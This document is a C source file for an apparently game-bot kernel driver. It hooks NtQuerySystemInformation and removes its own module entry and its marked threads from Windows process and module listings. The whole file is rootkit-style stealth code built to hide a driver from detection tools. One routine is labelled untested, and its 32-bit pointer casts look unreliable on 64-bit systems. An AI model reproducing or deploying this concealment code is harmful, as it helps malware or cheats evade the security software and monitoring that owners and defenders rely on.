#include "querysystem.h"
#include "handler.h"

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION
{
	SYSTEM_THREAD_INFORMATION ThreadInfo;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID Win32StartAddress;
	PVOID TebBase; // since VISTA
	ULONG_PTR Reserved2;
	ULONG_PTR Reserved3;
	ULONG_PTR Reserved4;
} SYSTEM_EXTENDED_THREAD_INFORMATION, * PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_ID_INFORMATION
{
	PVOID ProcessId;
	UNICODE_STRING ImageName;
} SYSTEM_PROCESS_ID_INFORMATION, * PSYSTEM_PROCESS_ID_INFORMATION;

typedef struct _RTL_PROCESS_MODULE_INFORMATION_EX
{
	USHORT NextOffset;
	SYSTEM_MODULE_ENTRY BaseInfo;
	ULONG ImageChecksum;
	ULONG TimeDateStamp;
	PVOID DefaultBase;
} RTL_PROCESS_MODULE_INFORMATION_EX, * PRTL_PROCESS_MODULE_INFORMATION_EX;

__declspec(noinline) void setDr(PVOID param);

extern PVOID ImageBase;

static void hookSystemAllProcessInformation(PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength, BOOLEAN notExt) {
	ULONG i, len, threadLen, shift, nextOff;
	PSYSTEM_PROCESS_INFO curr;
	PSYSTEM_THREAD_INFORMATION currThread;
	DbgPrintEx(0, 0, "[Bot] SystemAllProcessInformation\n");

	//might as well use it :D
	if (ReturnLength) {
		len = *ReturnLength;
	} else {
		len = SystemInformationLength;
	}

	threadLen = notExt ? sizeof(SYSTEM_THREAD_INFORMATION) : sizeof(SYSTEM_EXTENDED_THREAD_INFORMATION);
	curr = SystemInformation;
	shift = 0;
	do {
		for (i = 0; i < curr->NumberOfThreads;) {
			currThread = notExt ? &curr->Threads[i] : &((PSYSTEM_EXTENDED_THREAD_INFORMATION)curr->Threads)[i];
			if (currThread->StartAddress == setDr) {
				DbgPrintEx(0, 0, "[Bot] PID: %p Name: %wZ Thread count: %u\n", curr->UniqueProcessId, curr->ImageName, curr->NumberOfThreads);
				memcpy(currThread, ((uint8_t*)currThread) + threadLen, len - (((uint32_t)currThread) - ((uint32_t)SystemInformation)) - threadLen);
				--curr->NumberOfThreads;
				if (curr->NextEntryOffset) curr->NextEntryOffset -= threadLen;
				shift += threadLen;
				len -= threadLen;
				if (ReturnLength) *ReturnLength = len;
				//DbgPrintEx(0, 0, "[Bot] PID: %p Name: %wZ Thread count: %u\n", curr->UniqueProcessId, curr->ImageName, curr->NumberOfThreads);
			} else {
				++i;
			}
		}
		if (curr->ImageName.Buffer) ((uint8_t*)curr->ImageName.Buffer) -= shift;

		nextOff = curr->NextEntryOffset;
		curr = ((uint8_t*)curr) + nextOff;
	} while (nextOff);
}

static void hookSystemModuleInformation(PSYSTEM_MODULE_INFORMATION SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	ULONG i, len;
	PSYSTEM_MODULE_ENTRY curr;
	DbgPrintEx(0, 0, "[Bot] count %u\n", SystemInformation->Count);

	if (ReturnLength) {
		len = *ReturnLength;
	} else {
		len = SystemInformationLength;
	}

	for (i = 0; i < SystemInformation->Count; ++i) {
		curr = &SystemInformation->Module[i];
		if (curr->ImageBase == ImageBase) {
			DbgPrintEx(0, 0, "[Bot] Module %s\n", SystemInformation->Module[i].FullPathName);
			if ((i + 1) != SystemInformation->Count) {
				memcpy(curr, &curr[1], len - (((ULONG)curr) - ((ULONG)SystemInformation)) - sizeof(SYSTEM_MODULE_ENTRY));
			}
			--SystemInformation->Count;
			if (ReturnLength) *ReturnLength -= sizeof(SYSTEM_MODULE_ENTRY);
			break;
		}
	}
	DbgPrintEx(0, 0, "[Bot] count %u\n", SystemInformation->Count);
}

//NOT TESTED!
static void hookSystemModuleInformationEx(PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	ULONG nextOff, len;
	PRTL_PROCESS_MODULE_INFORMATION_EX curr, prev;

	if (ReturnLength) {
		len = *ReturnLength;
	} else {
		len = SystemInformationLength;
	}

	curr = SystemInformation;
	prev = NULL;
	do {
		if (curr->BaseInfo.ImageBase == ImageBase) {
			if (curr->NextOffset) {
				if (prev) {
					prev->NextOffset += curr->NextOffset;
				} else {
					memcpy(curr, ((uint8_t*)curr) + curr->NextOffset, len - curr->NextOffset);
					if (ReturnLength) {
						*ReturnLength -= curr->NextOffset;
					}
				}
			} else {
				if (prev) {
					prev->NextOffset = 0;
					if (ReturnLength) {
						*ReturnLength -= len - (((ULONG)curr) - ((ULONG)SystemInformation));
					}
				} else {
					//no fucking way im the only module
				}
			}
			break;
		}

		nextOff = curr->NextOffset;
		curr = ((uint8_t*)curr) + nextOff;
	} while (nextOff);
}

NTSTATUS NTAPI hookNtQuerySystemInformation(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
) {
	NTSTATUS status;
	status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (NT_SUCCESS(status)) {
		switch (SystemInformationClass) {
			case SystemProcessInformation:
				DbgPrintEx(0, 0, "[Bot] SystemProcessInformation\n");
				hookSystemAllProcessInformation(SystemInformation, SystemInformationLength, ReturnLength, TRUE);
				break;
			case SystemModuleInformation:
				DbgPrintEx(0, 0, "[Bot] SystemModuleInformation\n");
				hookSystemModuleInformation(SystemInformation, SystemInformationLength, ReturnLength);
				break;
			/*
			case SystemHandleInformation:
				DbgPrintEx(0, 0, "[Bot] SystemHandleInformation\n");
				break;
			*/
			case SystemExtendedProcessInformation:
				DbgPrintEx(0, 0, "[Bot] SystemExtendedProcessInformation\n");
				hookSystemAllProcessInformation(SystemInformation, SystemInformationLength, ReturnLength, FALSE);
				break;
			/*
			case SystemExtendedHandleInformation:
				DbgPrintEx(0, 0, "[Bot] SystemExtendedHandleInformation\n");
				break;
			*/
			case SystemModuleInformationEx:
				DbgPrintEx(0, 0, "[Bot] SystemModuleInformationEx\n");
				hookSystemModuleInformationEx(SystemInformation, SystemInformationLength, ReturnLength);
				break;
			case SystemProcessIdInformation:
				DbgPrintEx(0, 0, "[Bot] SystemProcessIdInformation\n");
				break;
			case SystemFullProcessInformation:
				DbgPrintEx(0, 0, "[Bot] SystemFullProcessInformation\n");
				hookSystemAllProcessInformation(SystemInformation, SystemInformationLength, ReturnLength, FALSE);
				break;
			default:
				break;
		}
	}

	return status;
}